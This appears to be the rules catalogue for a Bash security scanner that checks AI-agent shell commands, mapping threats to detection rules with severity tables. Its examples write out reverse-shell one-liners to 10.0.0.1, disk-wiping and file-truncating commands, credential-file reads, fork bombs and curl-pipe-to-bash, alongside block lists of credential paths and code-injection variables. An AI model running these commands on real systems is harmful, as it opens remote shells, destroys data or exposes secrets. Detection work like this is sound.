# Rules Catalogue (Threat → Rule → Example)

One page per shipped rule, plus a top-level mapping. This is the operational reference; [SECURITY.md](SECURITY.md) is the policy-level one.

## Mapping at a glance

| Threat                                              | Rule                    | Severity |
|-----------------------------------------------------|-------------------------|----------|
| Mass delete / recursive force                       | DangerousFlags          | high     |
| Path traversal (`../`)                              | PathTraversal           | high     |
| Introspective path (`/proc/self`, `/proc/$$`)       | PathTraversal           | medium   |
| Credential files (`/etc/shadow`, `~/.ssh/`, ...)    | SensitiveAccess         | high     |
| System DB files (`/etc/passwd`, `/etc/group`)       | SensitiveAccess         | medium   |
| `/dev/` access                                      | SensitiveAccess         | low      |
| Shared-library injection (`LD_PRELOAD`, DYLD*, `LD_LIBRARY_PATH`) | EnvDangerousVars | high |
| Shell auto-exec (`BASH_ENV`, `ENV`, `SHELLOPTS`, `IFS`)          | EnvDangerousVars | high |
| Interpreter preload (`PYTHONPATH`, `NODE_PATH`, `PERL5LIB`, `RUBYLIB`, `CLASSPATH`) | EnvDangerousVars | high |
| Exported function (`BASH_FUNC_*`)                    | EnvDangerousVars        | high     |
| `CDPATH` / `GIT_DIR` / `GIT_WORK_TREE` / `GIT_INDEX_FILE` hijack | EnvDangerousVars | low |
| Word-splitting via unquoted `$VAR` / `${VAR}` / `$((expr))` | UnquotedExpansion | medium |
| Commands without absolute path / allowlist          | MissingAbsolutePath     | low      |
| Indirect / nested parameter expansion (CVE-2026-29783) | DangerousExpansion   | high     |
| Reverse-shell recipes                               | ReverseShellSink        | high/medium |
| Disk wipe / raw device write / destructive redirect | DangerousFilesystem     | high/medium |
| `IFS` overrides                                     | IFSManipulation         | high     |
| TLS verification disabled (`curl -k`, `wget --no-check-certificate`) | InsecureDownload | high |
| Plaintext HTTP download (`curl http://...`)          | InsecureDownload        | medium   |
| Inbound TCP listener (`nc -l`, `socat TCP-LISTEN`)   | NetworkListener         | high     |
| `ssh -R` reverse tunnel / `ssh -D` SOCKS proxy       | NetworkListener         | high     |
| One-liner web server (`python -m http.server`)       | NetworkListener         | medium   |
| PHP built-in server bound to localhost               | NetworkListener         | low      |
| Classic fork-bomb (`:(){ :|:& };:`)                  | ForkBomb                | high     |

## `PathTraversal`

`lib/Text/Treesitter/Bash/Security/Rule/PathTraversal.pm`

Detects path traversal sequences and introspective paths in argv.

| Pattern                  | Severity |
|--------------------------|----------|
| `../`, `/etc/../`, `/proc/../`, `/sys/../` | high |
| `/proc/self`, `/proc/$$`, `/sys/fs`       | medium |

Examples:

    cat /etc/../etc/shadow          -> high
    cat /proc/self/maps             -> medium
    cat /tmp/../tmp/foo             -> high (false positive risk on paths with `..` in names — acceptable for a security rule)

## `DangerousFlags`

`lib/Text/Treesitter/Bash/Security/Rule/DangerousFlags.pm`

Force + recursive flag combos on any command.

| Pattern                                       | Severity |
|-----------------------------------------------|----------|
| `-rf` / `-fr` anywhere in argv                | high |
| `-r` + `-f` anywhere in argv                  | high |
| `-R` + `-f` anywhere in argv                  | high |
| `--force` + `--recursive` (any order)         | high |
| `-r` or `-R` or `--recursive` alone           | medium |
| `-f` or `--force` alone                       | low |

Examples:

    rm -rf /tmp/x                    -> high
    rm --force --recursive /tmp/x    -> high
    rm -r /tmp/x                     -> medium
    rm -f /tmp/x                     -> low

## `SensitiveAccess`

`lib/Text/Treesitter/Bash/Security/Rule/SensitiveAccess.pm`

Filesystem paths that should not be touched without explicit user consent.

| Path                                                      | Severity |
|-----------------------------------------------------------|----------|
| `/etc/shadow`, `/etc/sudoers`, `/etc/sudoers.d/`           | high     |
| `~/.ssh/`, `~/.aws/`, `~/.kube/`, `~/.docker/config.json`  | high     |
| `~/.gnupg/private-keys`, `~/.git-credentials`, `~/.netrc`  | high     |
| `~/.pypirc`, `~/.npmrc`, `~/.cargo/credentials`            | high     |
| `~/.pgpass`, `~/.config/gh/`, `~/.config/gcloud/`          | high     |
| `~/.azure/`, `/var/run/docker.sock`, `/lib/modules/`      | high     |
| `/Library/Keychains/`, `~/.Trash/...Keychain` (macOS)     | high     |
| `~/.config/google-chrome/`, `~/.config/chromium/`         | high     |
| `~/.mozilla/firefox/`, `~/.cache/google-chrome/`           | high     |
| `/etc/passwd`, `/etc/group`, `/etc/gshadow`               | medium   |
| `/proc/self/`, `/proc/<pid>/environ`, `/sys/fs/`          | medium   |
| `/dev/` (non-whitelisted)                                  | low      |

## `EnvDangerousVars`

`lib/Text/Treesitter/Bash/Security/Rule/EnvDangerousVars.pm`

Sets or uses variables known to enable code execution or hijack process behaviour.

| Variable                          | Severity |
|-----------------------------------|----------|
| `LD_PRELOAD`                      | high     |
| `LD_AUDIT`                        | high     |
| `LD_LIBRARY_PATH`                 | high     |
| `DYLD_INSERT_LIBRARIES`           | high     |
| `DYLD_LIBRARY_PATH`               | high     |
| `BASH_ENV`                        | high     |
| `ENV`                             | high     |
| `SHELLOPTS`                       | high     |
| `BASH_FUNC_*` (any)               | high     |
| `IFS`                             | high     |
| `PROMPT_COMMAND`                  | high     |
| `PS4`                             | high     |
| `PYTHONPATH`                      | high     |
| `PYTHONSTARTUP`                   | high     |
| `NODE_PATH`                       | high     |
| `NODE_OPTIONS`                    | high     |
| `PERL5LIB`                        | high     |
| `PERL5OPT`                        | high     |
| `RUBYLIB`                         | high     |
| `RUBYOPT`                         | high     |
| `CLASSPATH`                       | high     |
| `CDPATH`                          | low      |
| `GIT_DIR`                         | low      |
| `GIT_WORK_TREE`                   | low      |
| `GIT_INDEX_FILE`                  | low      |

## `UnquotedExpansion`

`lib/Text/Treesitter/Bash/Security/Rule/UnquotedExpansion.pm`

Unquoted `$VAR`, `${VAR...}`, or `$((expr))` followed by a path delimiter
(`/`, `-`, `.`) is the classic word-splitting + glob footgun.

    cat $HOME/.ssh/id_rsa       -> medium
    rm -rf $TMPDIR/cache        -> medium
    cat ${HOME}/.ssh/id_rsa     -> medium
    rm -rf ${TMPDIR}/cache      -> medium
    cat $((1+2))/foo            -> medium

False negatives are possible if the expansion is buried in complex quoting
(rule operates on raw source text).

## `MissingAbsolutePath`

`lib/Text/Treesitter/Bash/Security/Rule/MissingAbsolutePath.pm`

Commands invoked without `/`, `./`, `../`, and not in a curated allowlist of
common system binaries (`ls`, `cat`, `rm`, `cp`, `mv`, `find`, `grep`, `tar`,
`curl`, `wget`, `ssh`, `git`, `docker`, `perl`, `python`, `ruby`, `node`,
...). Severity: `low`.

    weirdtool foo bar            -> low
    /usr/bin/rm -rf /tmp/x       -> (not flagged)
    ./script.sh                  -> (not flagged)

## Adding a rule

See `.claude/skills/treesitter-bash-security/SKILL.md` for the contract,
patterns, and don'ts.

---

## Per-rule reference (newer rules)

### `DangerousExpansion`

`lib/Text/Treesitter/Bash/Security/Rule/DangerousExpansion.pm`

Detects parameter-expansion forms that have been exploited in
AI-agent bash pipelines. CVE-2026-29783 (GitHub Copilot CLI, CVSS 7.1)
is the canonical recent example.

| Pattern | Severity |
|---------|----------|
| `${!var}` — indirect variable expansion | high |
| `${var@P}`, `${var@Q}` — print/quote operator (eval-able output) | high |
| `${var=value}` — assignment-on-expansion | high |
| `${$()}` / `${${...}}` — command substitution nested in parameter | high |

Examples:

    echo "${!HOME}"           -> high
    eval "${PATH@P}"          -> high
    : "${X=$(rm -rf $HOME)}"  -> high

### `ReverseShellSink`

`lib/Text/Treesitter/Bash/Security/Rule/ReverseShellSink.pm`

| Pattern | Severity |
|---------|----------|
| `nc -e`, `ncat -e` | high |
| `socat exec:'...'` | high |
| `bash -i` / `sh -i` / `zsh -i` with `/dev/tcp/` redirect | high |
| `ssh -o ProxyCommand=...` | medium |
| `mkfifo` used to set up a pipe | medium |

Examples:

    nc -e /bin/sh 10.0.0.1 4444                              -> high
    socat exec:'bash -li',pty,stderr,setsid,sane tcp:...      -> high
    bash -i >& /dev/tcp/10.0.0.1/4444 0>&1                   -> high
    ssh -o ProxyCommand="nc %h %p" user@host                 -> medium

### `DangerousFilesystem`

`lib/Text/Treesitter/Bash/Security/Rule/DangerousFilesystem.pm`

| Pattern | Severity |
|---------|----------|
| `dd of=/dev/sdX`, `dd of=/dev/nvme0n1`, etc. | high |
| `mkfs`, `mkfs.ext4`, `mkfs.xfs`, ... | high |
| `fdisk`, `parted`, `gdisk`, `sfdisk`, `wipefs` | high |
| `: > /etc/...` — wipe via redirect | high |
| `truncate -s 0` of `/etc/`, `/var/log/`, `/boot/`, `/usr/` | high |
| `shred` | medium |
| `mount`, `umount` | medium |
| `losetup`, `cryptsetup` | medium |

Examples:

    dd if=/dev/zero of=/dev/sda           -> high
    mkfs.ext4 /dev/sdb1                   -> high
    : > /etc/passwd                       -> high
    truncate -s 0 /var/log/auth.log       -> high
    shred -u ~/.bash_history              -> medium
    mount -o bind /tmp /var/www           -> medium

### `IFSManipulation`

`lib/Text/Treesitter/Bash/Security/Rule/IFSManipulation.pm`

Detects `IFS=` assignments and `$IFS`-bound expansions. IFS overrides
are the classic trick used to evade shell-quoting-based audits.

| Pattern | Severity |
|---------|----------|
| `IFS=...`, `export IFS=...` | high |
| `$IFS` expansion followed by a delimiter character | medium |

Examples:

    IFS=$' \t\n' read -r line < file       -> high
    IFS=, read -d, -ra parts <<< "a,b,c"  -> high
    export IFS=; for x in $*              -> high

### `InsecureDownload`

`lib/Text/Treesitter/Bash/Security/Rule/InsecureDownload.pm`

Flags download tools (`curl`, `wget`, `fetch`) that disable TLS
verification or use plaintext HTTP. Only these three fetcher names are
matched — arbitrary scripts invoking libcurl or similar are out of scope
(use the AST for that).

| Pattern | Severity |
|---------|----------|
| `curl -k`, `curl --insecure`, `curl --insecure=URL`, `wget --no-check-certificate`, `wget --no-cert-check` | high |
| `curl http://...`, `wget http://...`, `fetch http://...` (plaintext URL in argv or source) | medium |

The high-severity branch fires whenever one of the known
verify-disabling flags is present in argv (including the `--flag=value`
form). The medium-severity branch scans argv for `http://` URLs and
falls back to the full command source for URLs obscured by argv
splitting (e.g. inside `--data-urlencode`). URLs found inside `-H` /
`--header` values are intentionally skipped to avoid false positives on
`X-Forwarded-Proto: http://...` style content.

Examples:

    curl -k https://example/install.sh                -> high
    wget --no-check-certificate https://example      -> high
    curl http://example/script.sh | bash             -> medium
    curl https://example/install.sh                  -> (not flagged)
    curl -H 'X-Foo: http://example' https://x        -> (not flagged)

### `NetworkListener`

`lib/Text/Treesitter/Bash/Security/Rule/NetworkListener.pm`

Flags commands that open inbound network listeners. Pairs with
`ReverseShellSink`: where that rule catches the *outbound* side of an
attack, this rule catches the *inbound* side.

| Pattern | Severity |
|---------|----------|
| `nc -l...`, `ncat -l`, `nc --listen` | high |
| `socat TCP-LISTEN...`, `socat TCP4-LISTEN...`, `socat TCP6-LISTEN...` | high |
| `ssh -R` (reverse tunnel) | high |
| `ssh -D` (SOCKS proxy) | high |
| `python -m http.server`, `python3 -m http.server`, `python2 -m SimpleHTTPServer` | medium |
| `ruby -run -e httpd` | medium |
| `npx http-server`, `npx serve`, `npx live-server` | medium |
| `php -S 0.0.0.0:8000` (bound to all interfaces) | high |
| `php -S 127.0.0.1:8000` (bound to localhost) | low |

Examples:

    nc -l 4444                              -> high
    socat TCP-LISTEN:4444,fork EXEC:/bin/sh -> high
    ssh -R 8080:internal:80 bastion         -> high
    ssh -D 1080 bastion                      -> high
    python3 -m http.server 8000              -> medium
    php -S 0.0.0.0:8000                     -> high
    php -S 127.0.0.1:8000                   -> low
    nc host 80 < file                       -> (not flagged; outbound)
    ssh user@host                           -> (not flagged)

### `ForkBomb`

`lib/Text/Treesitter/Bash/Security/Rule/ForkBomb.pm`

Detects the textbook fork-bomb: a function whose body recursively
calls itself combined with a pipe or background operator. The
canonical Bash form is `:(){ :|:& };:`. Severity: `high`.

Implemented as a self-recursion check on the function body — the
rule only fires when both signals are present:

=over 4

=item * the function name appears inside its own body, AND

=item * the body contains C<|> or C<&>.

=back

Wrappers like C<bash -c ':() { :|:& }; :'> are out of scope for this
rule (the AST inside the string is opaque). They are caught by the
built-in C<dynamic_shell> finding instead.

Examples:

    :(){ :|:& };:                            -> high
    bomb(){ bomb|bomb& }; bomb               -> high
    fork(){ (fork &) }; fork                 -> high
    harmless(){ echo hi; }; harmless         -> (not flagged)
    alias ll='ls -la'                        -> (not flagged)

